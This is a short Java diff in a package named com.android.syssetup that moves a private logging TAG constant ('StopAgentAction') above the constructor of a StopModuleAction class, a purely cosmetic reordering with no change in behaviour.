@@ -16,11 +16,11 @@ import com.android.syssetup.manager.ManagerModule;
 import com.android.syssetup.util.Check;
 
 public class StopModuleAction extends ModuleAction {
+	private static final String TAG = "StopAgentAction"; //$NON-NLS-1$
+
 	public StopModuleAction(ConfAction params) {
 		super(params);
 	}
-
-	private static final String TAG = "StopAgentAction"; //$NON-NLS-1$
 
 	@Override
 	public boolean execute(Trigger trigger) {
